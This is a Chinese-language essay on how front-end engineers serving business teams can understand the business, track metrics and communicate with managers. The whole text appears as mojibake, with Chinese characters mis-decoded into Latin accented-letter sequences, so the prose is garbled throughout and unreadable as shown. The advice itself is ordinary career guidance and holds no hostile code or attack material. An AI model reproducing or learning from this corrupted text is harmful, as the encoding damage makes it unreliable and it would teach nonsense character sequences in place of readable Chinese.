ä¸šåŠ¡å‰ç«¯â€œå¥½å¿™â€ä¸šåŠ¡å‰ç«¯ï¼Œé¡¾åæ€ä¹‰ï¼Œåšä¸šåŠ¡çš„å‰ç«¯ï¼Œç›´æ¥ä¸ä¸šåŠ¡çš„ PDã€è¿è¥æ¥è§¦ï¼Œå¯¹äº§å“çš„ç”¨æˆ·ç›´æ¥è´Ÿè´£ã€‚åœ¨å®é™…çš„å·¥ä½œä¸­ï¼Œä¸šåŠ¡å‰ç«¯ç»å¸¸å¿™äºä¸šåŠ¡çš„å„ç§ä¼šè®®ã€é¡¹ç›®å’Œç­”ç–‘ï¼Œå³ä¾¿ä¸€æ¡ä¸šåŠ¡çº¿ä¸Šæœ‰å¤šä¸ªå‰ç«¯åŒå­¦æ”¯æŒï¼Œé¢å¯¹æˆå±±çš„éœ€æ±‚ï¼Œå¯èƒ½ä¾ç„¶æ„Ÿåˆ°åƒåŠ›ï¼Œè¿™å…¶ä¸­çš„åŸå› å¯èƒ½æœ‰ï¼š ç”¨æˆ·ä¾§äº§å“å¾€å¾€éœ€è¦å¿«é€Ÿä¸Šçº¿ï¼Œå¤§éƒ¨åˆ†éœ€æ±‚éƒ½éœ€è¦å€’æ’å·¥æœŸï¼Œå¼€å‘æ—¶é—´å°¤å…¶ç´§å¼  å¯¹ä¸šåŠ¡ä¸ç†Ÿæ‚‰ï¼Œåœ¨é¡¹ç›®éœ€æ±‚å·²ç¡®å®šçš„æ—¶å€™æ‰å»å‚åŠ è§†è§‰è¯„å®¡ï¼Œæ²¡æœ‰åŠæ³•åˆ¤æ–­éœ€æ±‚èƒŒåçš„ä¸šåŠ¡é€»è¾‘è·Ÿä¸šåŠ¡å¤§èŠ‚å¥æ˜¯å¦åŒ¹é…ã€éœ€æ±‚æœ¬èº«æ˜¯å¦èƒ½å¤Ÿè¾¾æˆä¸šåŠ¡ç›®æ ‡ã€æœ‰æ²¡æœ‰æ›´å¥½çš„å®ç°æ–¹å¼ï¼Œåªèƒ½æ¥ä¸‹éœ€æ±‚ï¼Œç„¶åæ’æœŸ ç»´æŠ¤æˆæœ¬é«˜ï¼Œæ¯å¤©è¿˜è¦å¿™äºè§£å†³å„ç§çº¿ä¸Šé—®é¢˜ï¼Œæ¯”å¦‚è¿™é‡Œæ ·å¼æœ‰ç‚¹é—®é¢˜ï¼Œé‚£é‡Œæ€ä¹ˆæ²¡æœ‰æ˜¾ç¤ºâ€¦â€¦å„ç§çç¢é—®é¢˜è®©ä½ è¿‡çš„éå¸¸â€œå……å®â€ éœ€æ±‚å“åº”é€Ÿåº¦è¾ƒæ…¢ï¼Œæ¯”å¦‚ä¸šåŠ¡çš„æŠ€æœ¯æ ˆè¾ƒè€ï¼Œæˆ–è€…å®šåˆ¶é€»è¾‘è¿‡å¤šï¼Œè¾¹å†™ä»£ç è¿˜è¦è¾¹æŸ¥æ–‡æ¡£ï¼ŒæŸ¥ä¸åˆ°å¯èƒ½è¿˜è¦æŸ¥æºç ï¼Œæ•ˆç‡å¤§å¹…é™ä½ã€‚åˆæˆ–è€…è·Ÿåˆ«çš„ä¸šåŠ¡æŠ€æœ¯ä½“ç³»ä¸åŒï¼Œéš¾ä»¥å¤ç”¨å’Œæ²‰æ·€ï¼Œå¦‚æœè¦ç”¨ï¼Œå¯èƒ½è¿˜è¦é‡å†™ä¸€éâ€¦â€¦ â– ä¸šåŠ¡å‰ç«¯æ˜¯â€œèµ„æºâ€? å‰ç«¯å²—ä½çš„ç‰¹ç‚¹å°±æ˜¯æœ‰è§†è§‰ç¨¿å°±å¯ä»¥å®Œæˆå·¥ä½œï¼Œä¸éœ€è¦ç†è§£ä¸šåŠ¡å…¨è²Œï¼Œæ‰€ä»¥åœ¨ç¹å¿™æœŸå¾ˆå®¹æ˜“è®©å‰ç«¯å¿½è§†äº†ä¸šåŠ¡æ€è€ƒï¼ŒåŠ ä¸Šä¹‹å‰æè¿°çš„å„ç§åŸå› ï¼Œä¸šåŠ¡å‰ç«¯ç»å¸¸æ²¦è½ä¸ºâ€œèµ„æºâ€ï¼Œå½“ä½ æ²¦è½ä¸ºâ€œèµ„æºâ€çš„æ—¶å€™ï¼Œå…¶å®å°±å·²ç»å¤±å»äº†å’Œä¸šåŠ¡å¹³ç­‰å¯¹è¯çš„èµ„æ ¼ï¼Œä»–ä»¬åªä¼šæŠŠä½ å½“æˆè«å¾—æ„Ÿæƒ…çš„å¼€å‘æœºå™¨ï¼Œè·Ÿä½ è¾“å…¥éœ€æ±‚ï¼Œè®©ä½ åå‡ºé¡µé¢ï¼Œè€Œä½ åœ¨è¿™æ ·çš„å…³ç³»ä¸­ï¼Œæœ¬æ¥å†™ç€è¿˜ç®—å·¥æ•´çš„ä»£ç ï¼Œä¸ºäº†å¿«é€Ÿå®ç°ä¸šåŠ¡éœ€æ±‚ï¼Œä¹Ÿå¼€å§‹å†™èµ·ä¹±ç³Ÿç³Ÿçš„ä»£ç ï¼Œå¯¹äºä½ æ‰€åˆ›é€ çš„äº§å“ä¹Ÿæ²¡æœ‰è¯è¯­æƒï¼Œä¹…è€Œä¹…ä¹‹ä¹Ÿå¤±å»äº†æ¿€æƒ…å’Œè€å¿ƒã€‚ å¤±å»æ¿€æƒ…ï¼Œå†™çš„ä¸å¼€å¿ƒä¹Ÿå°±ç®—äº†ï¼Œå› ä¸ºä½ æ²¡æœ‰åšå‡ºä»€ä¹ˆç‰¹åˆ«çš„ä¸œè¥¿ï¼Œè€æ¿ä¹Ÿä¸ä¼šç‰¹åˆ«è®¤å¯ä½ çš„è¾›è‹¦ï¼Œè¿˜ä¼šè§‰å¾—ä½ æ€è€ƒä¸å¤Ÿã€æ²¡æœ‰ä¸šåŠ¡ senceï¼Œå¯¹ä¸šåŠ¡æ²¡æœ‰åŠ©åŠ›ï¼Œæ²¡æœ‰è®©ä¸šåŠ¡å› ä¸ºä½ çš„å­˜åœ¨è€Œæœ‰æ‰€ä¸åŒâ€¦â€¦ â– ä¸šåŠ¡å‰ç«¯æƒ³çªç ´å¥½å§ï¼Œé‚£æˆ‘å†³å®šåšç‚¹ä»€ä¹ˆæ”¹å˜ä¸€ä¸‹ï¼Œäºæ˜¯è·Ÿè€æ¿æå‡ºäº†ä¸€ç³»åˆ—æƒ³æ³•ï¼š è¿™é‡ŒæŠ€æœ¯ä½“ç³»å¤ªè€äº†ï¼Œä¸ºäº†è¿›ä¸€æ­¥æå‡å¼€å‘æ•ˆç‡ï¼Œæˆ‘ä»¬æƒ³è¦ææŠ€æœ¯é‡æ„ å‰åç«¯è”è°ƒæœ‰ç‚¹è´¹åŠ²ï¼Œæˆ‘ä»¬æƒ³æä¸ªè”è°ƒæ•°æ®ä¸­å°ï¼Œæå‡è”è°ƒæ•ˆç‡ é‚£é‡Œå±•ç°é€Ÿåº¦å¤ªæ…¢äº†ï¼Œæˆ‘ä»¬è¦ææ€§èƒ½ä¼˜åŒ– â€¦â€¦ è€æ¿å¾€å¾€ä¼šæ¥ä¸€ç³»åˆ—çµé­‚æé—®ï¼š ä¸ºä»€ä¹ˆè¦åšï¼Ÿï¼ˆæœ‰ä»€ä¹ˆä¸šåŠ¡ä»·å€¼ï¼Ÿæœ‰ä»€ä¹ˆæŠ€æœ¯ä»·å€¼ï¼Ÿï¼‰ ä¸ºä»€ä¹ˆæ˜¯ç°åœ¨åšï¼Ÿ ä¸ºä»€ä¹ˆæ˜¯ä½ åšï¼Ÿ ROIï¼ˆæŠ•å…¥äº§å‡ºæ¯”ï¼‰æ€ä¹ˆæ ·ï¼Ÿ è¿˜æ²¡æœ‰å¼€å§‹ï¼ŒèºåŠ¨çš„å¿ƒå°±è¢«è€æ¿çš„ä¸€ç³»åˆ—â€œè´¨ç–‘â€æµ‡äº†ä¸€ç›†å†·æ°´ã€‚ å¦‚æœæ²¡æœ‰å›ç­”å¥½è¿™äº›é—®é¢˜ã€è¯´æœè€æ¿ï¼Œè‡ªç„¶ä¹Ÿäº‰å–ä¸åˆ°ä»€ä¹ˆèµ„æºï¼Œåªèƒ½ä¸€ä¸ªäººææï¼Œä¸€ä¸ªäººæçš„å¾€å¾€è´¨é‡ä¸è¡Œã€ä¹Ÿæ²¡æœ‰äººç”¨ï¼Œä¹…è€Œä¹…ä¹‹è‡ªå·±ä¹Ÿä¸ç»´æŠ¤äº†ï¼Œåªèƒ½åˆå¼€å§‹åŸ‹å¤´åœ¨éœ€æ±‚ä¸­ã€‚ å¹²çš„ä¸å¼€å¿ƒï¼Œä¹Ÿæ²¡æœ‰æˆé•¿ï¼Œæœ€ååªèƒ½æš—æ·¡ç¦»èŒï¼Œä½†æ¢äº†ä¸€ä¸ªå…¬å¸å°±ä¼šå¥½å—ï¼Œå¾ˆå¯èƒ½åˆæ˜¯ç±»ä¼¼çš„è¿‡ç¨‹â€¦â€¦ è¿™çœŸçš„å ªç§°æ˜¯ä¸šåŠ¡å‰ç«¯çš„â€œå›°å¢ƒâ€ï¼Œé‚£ä¹ˆå¦‚ä½•çªç ´è¿™ç§å›°å¢ƒå‘¢ï¼Ÿé¦–å…ˆæˆ‘ä»¬å°±è¦æ‘†æ­£å¿ƒæ€ï¼Œä»äº†è§£ä¸šåŠ¡å¼€å§‹ã€‚ \äº†è§£ä¸šåŠ¡** â– ä¸šåŠ¡å’Œéœ€æ±‚ åœ¨äº†è§£ä¸šåŠ¡ä¹‹å‰ï¼Œé¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“ï¼Œä¸šåŠ¡è·Ÿéœ€æ±‚æ˜¯ä¸ä¸€æ ·çš„ã€‚ç†è§£éœ€æ±‚å¹¶ä¸ç­‰äºç†è§£ä¸šåŠ¡ï¼Œéœ€æ±‚æ˜¯ä¸šåŠ¡ç»è¿‡äº§å“æ¶ˆåŒ–åçš„äº§ç‰©ï¼Œå¯èƒ½å·²ç»ç»è¿‡æ¼”ç»æˆ–è€…æ‹†è§£ï¼Œå› æ­¤éœ€æ±‚å¹¶ä¸æ˜¯ä¸šåŠ¡æœ¬èº«ï¼Œå½“ç„¶äº†è§£çš„éœ€æ±‚è¶Šå¤šï¼Œå¯¹ä¸šåŠ¡çš„å…¨è²Œä¹Ÿä¼šæ›´åŠ äº†è§£ã€‚ é‚£ä¹ˆä»€ä¹ˆæ˜¯ä¸šåŠ¡å‘¢ï¼Ÿä¸šç•Œå¯¹â€ä¸šåŠ¡â€æœ‰å¤šç§å®šä¹‰ï¼Œä½†æ˜¯å…¶ä¸»è¦æ€æƒ³åŸºæœ¬ä¸å˜ï¼Œä¸šåŠ¡å°±æ˜¯ä¸€ç³»åˆ—äººé€šè¿‡ä¸€ç³»åˆ—æ´»åŠ¨å®ŒæˆæŸä¸€ä»»åŠ¡çš„è¿‡ç¨‹ï¼Œå› æ­¤ï¼Œä¸šåŠ¡å¯å¤§å¯å°ï¼Œå¯ä»¥æ— é™æ‹†åˆ†ã€‚ æˆ‘ä»¬æœ¬æ–‡æ¶‰åŠçš„ä¸šåŠ¡æ³›æŒ‡å•†ä¸šä¸šåŠ¡ï¼Œå°±æ˜¯ä¸è¯¥ BU æˆ–è€…å…¬å¸å•†ä¸šæ¨¡å¼ç›´æ¥å…³è”çš„ä¸šåŠ¡æˆ–å…¶ç»„æˆéƒ¨åˆ†ã€‚ â– å‰ç«¯ä¸ºä»€ä¹ˆè¦å­¦ä¹ ä¸šåŠ¡ å‰ç«¯å³ä½¿ä¸å­¦ä¹ ä¸šåŠ¡ï¼Œå…¶å®ä¹Ÿä¸å½±å“åšéœ€æ±‚ï¼Œæ¯•ç«Ÿä½ åªè¦å‘Šè¯‰æˆ‘äº¤äº’æ˜¯ä»€ä¹ˆæ ·çš„ï¼Œå‰ç«¯å°±å¯ä»¥å¸®ä½ å®ç°ï¼Œè€Œä¸”å·²ç»æœ‰äº§å“ç»ç†çš„è§’è‰²äº†ï¼Œå¤§å®¶å„å¸å…¶èŒä¸å°±å¥½äº†ï¼Œä¸ºä»€ä¹ˆä¸€ä¸ªåšæŠ€æœ¯çš„ï¼Œè¦ç‹—æ‹¿è€—å­ã€æˆ–è€…æ˜¯è¶Šä¿ä»£åº–å‘¢ï¼Ÿè¿™å°±è¦è¯´åˆ°ï¼š åªæœ‰äº†è§£ä¸šåŠ¡ï¼Œæ‰èƒ½ä»æŠ€æœ¯çš„è§’åº¦æƒ³åˆ°ä¸šåŠ¡æ–¹ä¸æ›¾æƒ³åˆ°çš„åœ°æ–¹ï¼›ä¸äº†è§£ä¸šåŠ¡ï¼Œä½ å¯èƒ½å¬ä¸æ‡‚ä¸šåŠ¡æ–¹è¦ä»€ä¹ˆï¼Œç”šè‡³è¿éœ€æ±‚çš„ä¸šåŠ¡é€»è¾‘éƒ½æä¸æ¸…ï¼Œè¿™ç§æƒ…å†µçš„åˆä½œæ¨¡å¼åªæœ‰ä¸€ç§ï¼Œéœ€æ±‚ä¸‹æ¥äº†ï¼Œä½ æ¥ä½ï¼Œç„¶åç»™æ’æœŸã€‚ä¹Ÿè®¸ï¼Œè¿™ä¸ªéœ€æ±‚çš„è®¾è®¡ä¸åˆç†ï¼Œä½ ä¸çŸ¥é“ï¼›è¿™ä¸ªéœ€æ±‚æœ‰æ›´å¥½çš„å®ç°æ–¹æ¡ˆï¼Œä½ ä¸çŸ¥é“ï¼›è¿™ä¸ªéœ€æ±‚å¯ä»¥é€šè¿‡ç°æˆçš„å…³è”äº§å“æ–¹æ¡ˆè§£å†³ï¼Œçœæ—¶çœäººåŠ›ï¼Œä½ ä¹Ÿä¸çŸ¥é“ã€‚ åªæœ‰äº†è§£åˆ°ä¸šåŠ¡èƒŒåçš„åŸå› ï¼Œæ‰èƒ½ä»å…¨å±€çš„è§†è§’å»è§„åˆ’æŠ€æœ¯çš„æœªæ¥ã€‚ä¸äº†è§£ä¸šåŠ¡ï¼Œä¼šè®©ä½ ç¦»ç”¨æˆ·çš„çœŸå®éœ€æ±‚å¾ˆè¿œï¼Œä½ è¶Šéš¾å‘ç°å…¶ä¸­çš„ä¸€äº›ç—›ç‚¹å’ŒæŒ‘æˆ˜ï¼Œæ²¡æ³•çœŸæ­£æå‡ºä½ çš„æ€è€ƒå’Œè§£å†³æ–¹æ¡ˆï¼Œå»è§£å†³ç”¨æˆ·çš„éš¾é¢˜ã€‚ ä½œä¸ºä¸€åäº§å“ç ”å‘å·¥ç¨‹å¸ˆï¼Œè‡ªç„¶æ˜¯å¸Œæœ›äº²æ‰‹æ‰“ç£¨ä¸€æ¬¾è§£å†³ç”¨æˆ·é—®é¢˜ã€ä½“éªŒå‹å¥½çš„äº§å“ï¼Œå¦‚æœäº§å“èƒ½å¾—åˆ°ç”¨æˆ·è®¤å¯ï¼Œäº§ç”Ÿå½±å“åŠ›ã€è‡ªç„¶ä¼šç‰¹åˆ«æœ‰æˆå°±æ„Ÿã€‚ é˜¿é‡Œä½œä¸ºä¸€å®¶å•†ä¸šç§‘æŠ€å…¬å¸ï¼Œå¯¹æŠ€æœ¯äººçš„è¦æ±‚å°±æ˜¯æŠ€æœ¯ä¸ä¸šåŠ¡ç›¸ç»“åˆï¼Œåœ¨æ»¡è¶³ä¸šåŠ¡éœ€æ±‚çš„åŸºç¡€ä¸Šï¼Œæˆä¸ºæŠ€æœ¯ä¸ä¸šåŠ¡çš„æ¡¥æ¢ï¼Œä¸»åŠ¨èµ°è¿›ä¸šåŠ¡ï¼Œæ€è€ƒå¦‚ä½•é€šè¿‡æŠ€æœ¯æ‰‹æ®µå¸®åŠ©ä¸šåŠ¡åšèµ¢ã€æ»¡è¶³å¸‚åœºå’Œç”¨æˆ·éœ€æ±‚ï¼Œå…ˆä¸€æ­¥æŠ€æœ¯è§„åˆ’ã€äººæ‰å‚¨å¤‡ã€æŠ€æœ¯æ¶æ„å’ŒæŠ€æœ¯é¢„ç ”ã€‚ â– ä½ äº†è§£ä¸šåŠ¡å—ï¼Ÿ é‚£ä¹ˆç›®å‰ä½ äº†è§£ä½ å¯¹æ¥çš„ä¸šåŠ¡å—ï¼Ÿä¸å¦¨å°è¯•å›ç­”ä¸‹ä»¥ä¸‹é—®é¢˜ï¼š ä¸šåŠ¡åšçš„æ˜¯ä»€ä¹ˆï¼Ÿäº§å“å¤§å›¾æœ‰å—ï¼Ÿ ä¸šåŠ¡çš„æ ¸å¿ƒæŒ‡æ ‡æ˜¯ä»€ä¹ˆï¼ŸKPIç›®æ ‡æ˜¯ä»€ä¹ˆï¼Œè¿™äº›æ•°å­—èƒŒåçš„å«ä¹‰æ˜¯ä»€ä¹ˆï¼Ÿè¦è¾¾æˆè¿™äº›ç›®æ ‡ï¼Œä¸šåŠ¡ç­–ç•¥æ˜¯ä»€ä¹ˆï¼Ÿ ä¸šåŠ¡çš„ç”¨æˆ·æ˜¯è°ï¼Ÿæµé‡æ€ä¹ˆåˆ†å±‚ï¼Ÿå æ¯”å¤šå°‘ï¼Ÿåˆ†åˆ«åœ¨ä¸šåŠ¡ä¸­æ˜¯æ€æ ·çš„å®šä½ï¼Ÿ ä¸šåŠ¡çš„å•†ä¸šæ¨¡å¼ï¼Ÿé ä»€ä¹ˆå¸å¼•æµé‡ï¼Œç›ˆåˆ©æ¨¡å¼æ˜¯æ€æ ·çš„ï¼Ÿ æˆ‘ä»¬åšçš„é¡µé¢æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Ÿä¸ºä¸šåŠ¡å¸¦æ¥ä»€ä¹ˆä»·å€¼ï¼Ÿè¦åˆ›é€ æ›´å¤šçš„ä»·å€¼ï¼Œæˆ‘ä»¬å¯ä»¥åšä»€ä¹ˆï¼Ÿ â– å¦‚ä½•å­¦ä¹ ä¸šåŠ¡?**** ä¸šåŠ¡é¢†åŸŸçŸ¥è¯†çš„é˜…è¯»æ‰¾åˆ°è¯¥é¢†åŸŸç›¸å…³çš„è¯„åˆ†è¾ƒå¥½çš„ä¹¦ç±é›†ä¸­é˜…è¯»ï¼Œå¿«é€Ÿå½¢æˆçŸ¥è¯†æ¡†æ¶ã€‚ äº†è§£ä¸šåŠ¡èƒŒæ™¯å’Œè§„åˆ’ åˆšåˆšæ¥æ‰‹æ–°çš„ä¸šåŠ¡ï¼Œå¯ä»¥é‚€è¯·ä¸šåŠ¡æ–¹è€æ¿æˆ–è€…èµ„æ·±çš„è¿è¥/äº§å“åŒå­¦ï¼Œç»™ä½ è®²è®²è¿™å—ä¸šåŠ¡çš„è¿‡å»ã€ç°åœ¨ã€æœªæ¥ã€æ„¿æ™¯ã€è´¢å¹´è§„åˆ’ï¼Œä»¥åŠå¯¹æŠ€æœ¯åŒå­¦çš„æœŸæœ›ï¼› èŠ±æ—¶é—´è¯»åˆä½œæ–¹ï¼ˆè¿è¥ã€äº§å“ã€ç ”å‘ï¼‰çš„å‘¨æŠ¥ï¼Œäº†è§£ç°åœ¨åœ¨å‘ç”Ÿä»€ä¹ˆï¼Œæ˜¯ä¸æ˜¯ç¦»ç›®æ ‡è¶Šæ¥è¶Šè¿‘äº†ï¼› äº†è§£ä¸šåŠ¡ç›®æ ‡ã€è½åœ°ç­–ç•¥ã€è¡¡é‡ç›®æ ‡çš„æ•°æ®å£å¾„ï¼Œå…³æ³¨æ•°æ®ï¼Œå…³æ³¨ç›®å‰åšçš„é¡¹ç›®æ˜¯å¦ä¸ºäº†è¾¾æˆç›®æ ‡è€Œæˆ˜ï¼Œå¦‚æœä¸æ˜¯ï¼Œæå‡ºä½ çš„æƒ³æ³•å’Œå»ºè®®ï¼› å¤šå‚ä¼šï¼Œå»ºç«‹äº§å“ senseã€‚æ”¶é›†ä¿¡æ¯æœ€å¥½çš„æ–¹å¼å°±æ˜¯å‚åŠ æ‰€å¤„ä¸šåŠ¡è€å¤§çš„ KO ä¼šï¼Œå„ç§ KO ä¼šä¼šæŠŠæˆ˜ç•¥ä¸Šçš„æ‹†è§£å’ŒèƒŒåçš„æ€è€ƒæ•´ä½“æ¢³ç†ä¹‹åå®£è®²ä¼ è¾¾ç»™ BU æˆ–éƒ¨é—¨çš„åŒå­¦ï¼Œ å¤šäº¤æµä¸æœåŠ¡ç«¯åŒå­¦èŠå¤©ï¼Œä¸ PM èŠå¤©ï¼Œä¸ç”¨æˆ·èŠå¤©ï¼Œå¤šè§’åº¦çœ‹ä¸šåŠ¡ï¼Œä½†è¦æ³¨æ„çš„æ˜¯ï¼Œé’ˆå¯¹ä¸“ä¸šå‹æ¯”è¾ƒå¼ºçš„ä¸šåŠ¡ï¼Œéœ€è¦å…ˆåšåŠŸè¯¾ï¼Œè‡³å°‘ä¸€äº›è‹±æ–‡çš„ç¼©å†™è¦æ¸…æ¥šçš„æ˜ç™½æ„æ€ã€‚ è°¨è®°æ•°å­— å¦‚æœå‰é¢è¿˜éœ€è¦èŠ±æ¯”è¾ƒé•¿çš„æ—¶é—´ï¼Œé‚£è¿™ä¸€ä¸ªå¯ä»¥ç°åœ¨å°±åšèµ·æ¥ï¼Œé‚£å°±æ˜¯æŠŠä¸šåŠ¡ç›¸å…³çš„æ•°å­—è®°å¾—è¶Šç²¾ç»†çº¦å¥½ï¼Œè¶Šå…·ä½“è¶Šå¥½ï¼Œè¶Šå…¨é¢è¶Šå¤šè¶Šå¥½ã€‚è¿™æ ·åšæœ‰ä¸¤ä¸ªå¥½å¤„ï¼š æ‰€è®°çš„æ•°å­—æŒ‡æ ‡æœ¬èº«ï¼Œå¾ˆå¤§ç¨‹åº¦å·²ç»æ¶µç›–äº†è¿™ä¸ªä¸šåŠ¡ä»·å€¼æ–¹å‘ï¼Œä½ ä¾¿çŸ¥é“äº†è¿™ä¸ªä¸šåŠ¡é‡ç‚¹å…³æ³¨çš„æ˜¯å“ªä¸ªç»´åº¦çš„ä¸œè¥¿ è¿™äº›æ•°å­—å¯ä»¥ä½œä¸ºå’Œä¸šåŠ¡æ–¹ä»¥åŠäº§å“â€œå¹³ç­‰å¯¹è¯â€çš„æºå¤´ï¼Œå¦åˆ™è¿æœ€åŸºæœ¬çš„å¯¹è¯åŸºç¡€éƒ½æ²¡æœ‰ ä»æ—¥å¸¸éœ€æ±‚å…¥æ‰‹ å¯¹äºé¡¹ç›®ä¸­çš„éœ€æ±‚ï¼Œæˆ‘ä»¬è¦å°è¯•åˆ†æèƒŒåçš„ç›®çš„å’Œä»·å€¼ï¼Œåšäº†ä¹‹åæœ‰ä»€ä¹ˆé¢„æœŸçš„æ”¶ç›Šï¼Œä¸ºä»€ä¹ˆè¿™ä¹ˆåšå°±å¯ä»¥è¾¾åˆ°è¿™ä¸ªæ”¶ç›Šï¼Œè·Ÿæ€»ä½“ç›®æ ‡æ˜¯å¦å¥‘åˆï¼Œè¿˜è¦åˆ¤æ–­ä¸šåŠ¡æ–¹æåˆ°çš„ç‚¹æ˜¯ä¸æ˜¯æœ‰æ•ˆçš„æ–¹æ¡ˆæˆ–è€…è¯´æˆæœ¬å¤ªå¤§çš„æ–¹æ¡ˆï¼Œçœ‹èƒ½ä¸èƒ½ç»™å‡ºæ›¿ä»£æ–¹æ¡ˆï¼Œç”¨ç°æœ‰çš„æ–¹æ¡ˆæˆ–è€…å°æˆæœ¬çš„æ–¹å¼æ¥æ»¡è¶³ä¸šåŠ¡æ–¹ã€‚ è€Œåœ¨é¡¹ç›®ææµ‹ä¸Šçº¿åï¼Œè¿˜è¦ä»”ç»†åˆ†æä»¥åŠå¤šå…³æ³¨ä¸Šçº¿ä¹‹åçš„ä¸šåŠ¡æ•°æ®å’Œæ•ˆæœï¼Œä¼šæœ‰å¦‚ä¸‹å¥½å¤„ï¼š æé«˜è‡ªå·±å¯¹ä¸šåŠ¡çš„ç†è§£èƒ½åŠ›ï¼Œä½ åœ¨å…³æ³¨ä¸šåŠ¡æ•°æ®çš„åŒæ—¶ï¼Œä¹Ÿå°±ä¼šæ›´å¤šçš„ä»ä¸šåŠ¡çš„è§’åº¦æ¥çœ‹åˆ°è¿™ä¸ªåŠŸèƒ½æ‰€å¸¦æ¥çš„ä»·å€¼æ˜¯å¦ç¬¦åˆé¢„æœŸï¼Œå½“å‡ºç°ä¸ç¬¦åˆé¢„æœŸçš„æ—¶å€™ï¼Œå¯ä»¥å’Œä¸šåŠ¡æ–¹ä¸€èµ·è¿›è¡Œæ•°æ®æ¼æ–—çš„åˆ†æä»è€Œæ‰¾åˆ°é—®é¢˜æ‰€åœ¨ï¼Œé¿å…æˆ‘ä»¬çš„åŠ³åŠ¨æˆæœæˆä¸ºä¸€æ¬¡æ€§çš„å·¥ä½œã€‚ æ€»ç»“çš„åŒæ—¶å¯ä»¥å¸®åŠ©è‡ªå·±æ¢³ç†è¿™ä¸ªé¡¹ç›®ä¸­è‡ªå·±å“ªäº›åœ°æ–¹åšçš„ä¸è¶³ï¼Œæˆ–è€…ç›¸å…³æ¨è¿›ä¸­å­˜åœ¨ä»€ä¹ˆé—®é¢˜ï¼Œä»¥åŠåé¢æ€ä¹ˆæ”¹è¿›ï¼Œæé«˜äº†ä¸‹æ¬¡é¡¹ç›®ä¸­çš„è¿­ä»£æ•ˆç‡å’Œè´¨é‡ã€‚æ¯”å¦‚è¿™ä¸ªé¡¹ç›®æ˜¯å¦å­˜åœ¨éœ€æ±‚ç†è§£ä¸åˆ°ä½å­˜åœ¨è¿”å·¥ï¼Œæˆ–è€…æ²Ÿé€š &amp; è”è°ƒä½æ•ˆï¼Œç¯å¢ƒä¸ç¨³å®šï¼Œè‡ªå·±è®¾è®¡çš„æ–¹æ¡ˆæ˜¯å¦åˆç†ç­‰é—®é¢˜ï¼Œåç»­è¦æ€ä¹ˆè§£å†³ã€‚ ä¹Ÿå¯ä»¥ä»æ•°æ®å’Œæ€»ç»“ä¸­åˆ¤æ–­å‡ºä»€ä¹ˆæ ·çš„éœ€æ±‚æ˜¯é è°±çš„ &amp; ä»€ä¹ˆçš„æ ·ä¸šåŠ¡æ–¹æ˜¯é è°±çš„**ï¼Œ**é¢‘ç¹äº‰å–èµ„æºä¸Šçº¿æ•ˆæœåˆä¸å¥½çš„ä¸šåŠ¡æ–¹ï¼Œä¸‹æ¬¡å†æœ‰éœ€æ±‚è¿‡æ¥åˆ™éœ€è¦å¤šå¢åŠ ä¸€ä¸ªå¿ƒçœ¼å’Œæ€è€ƒçš„è¿‡ç¨‹ã€‚ åšæŒ ä¸šåŠ¡æ€è€ƒåŠ›ï¼Œæ²¡æœ‰ä¸ªè‡³å°‘åŠå¹´æ˜¯ä¸ä¼šè§æ•ˆçš„ \åŠ©åŠ›ä¸šåŠ¡** â– æ€è€ƒ å°½ç®¡å¹³æ—¶çš„ä¸šåŠ¡å¾ˆå¿™ï¼Œä½†å†å¿™ï¼Œä¹Ÿè¦æŠ½æ—¶é—´æ€è€ƒï¼Œé‚£ä¹ˆæ€è€ƒå“ªäº›å†…å®¹å‘¢ï¼Ÿä»¥ä¸‹ä¸¾ä¸€äº›ä¾‹å­ï¼š å…»æˆæ¯å¤©è®°å·¥ä½œå†…å®¹çš„ä¹ æƒ¯ï¼Œåˆ†æä¸€ä¸‹è‡ªå·±çš„æ—¶é—´åˆ°åº•è€—åœ¨å“ªäº† åœ¨ä¸šåŠ¡å¼€å‘ä¸­ï¼Œæœ‰é‡åˆ°è®©ä½ ç‰¹åˆ«æƒ³åæ§½çš„ç‚¹å—ï¼Ÿæƒ³ä¸‹é—®é¢˜èƒŒåçš„åŸå› ï¼Œæœ‰ä»€ä¹ˆæ–¹æ³•å¯ä»¥é¿å…ä¸‹æ¬¡ä¸çŠ¯ï¼Œèƒ½ä¸èƒ½æç‚¼ä¸ºæ›´åŠ é€šç”¨çš„è§£å†³æ–¹æ¡ˆï¼Œå…¶ä»–åŒå­¦æ€ä¹ˆè§£å†³çš„ï¼Œæˆ‘å¯ä»¥æ€ä¹ˆè§£å†³ï¼Ÿ ä¸æ–­åœ°è¾“å…¥ã€è§‚å¯Ÿï¼Œä¸šåŠ¡çš„çœŸå®éœ€æ±‚æ˜¯ä»€ä¹ˆï¼Ÿç«™åœ¨ä¸šåŠ¡æ–¹çš„è§’åº¦æ€è€ƒï¼Œä¸šåŠ¡é‡åˆ°çš„ç—›ç‚¹ã€æŒ‘æˆ˜åœ¨å“ªé‡Œï¼Ÿ â– æ²Ÿé€š**** å’Œè€æ¿ã€å›¢é˜ŸåŒå­¦ã€ä¸šåŠ¡æ–¹å¯¹ç„¦ï¼Œç¡®è®¤â€œæˆ‘æƒ³åšçš„â€æ˜¯ä¸æ˜¯â€œå¤§å®¶æƒ³è¦çš„â€ï¼Ÿ ä½ å¯èƒ½ä¼šæå‡ºå¾ˆå¤šæ„è§ï¼Œä½†ä¸€èˆ¬ä¼šé­åˆ°è€æ¿æˆ–è€…ä¸šåŠ¡æ–¹æ— æƒ…çš„æ‹’ç»ï¼Œè€Œä¸”é—®å¾—ä½ ä¸€è„¸æ‡µé€¼ï¼Œå°±æ¯”å¦‚ï¼š å½“å‰ä¸šåŠ¡èƒŒæ™¯ä¸‹ï¼Œä¸ºä»€ä¹ˆè¦åšï¼Ÿï¼ˆæœ‰ä»€ä¹ˆä¸šåŠ¡ä»·å€¼ï¼Ÿæœ‰ä»€ä¹ˆæŠ€æœ¯ä»·å€¼ï¼Ÿï¼‰ ç°åœ¨å¿…é¡»åšä¹ˆï¼Ÿ ä¸ºä»€ä¹ˆæ˜¯ä½ åšï¼Ÿ æ€ä¹ˆåšï¼Ÿï¼ˆä½“ç³»åŒ–ã€å…¨é“¾è·¯ã€å•ç‚¹æŠ€æœ¯æŒ‘æˆ˜ï¼‰ æœ‰ä»€ä¹ˆä¸šåŠ¡å’ŒæŠ€æœ¯ç»“æœï¼Ÿèƒ½å¦è¢«å¤ç”¨ï¼Ÿ 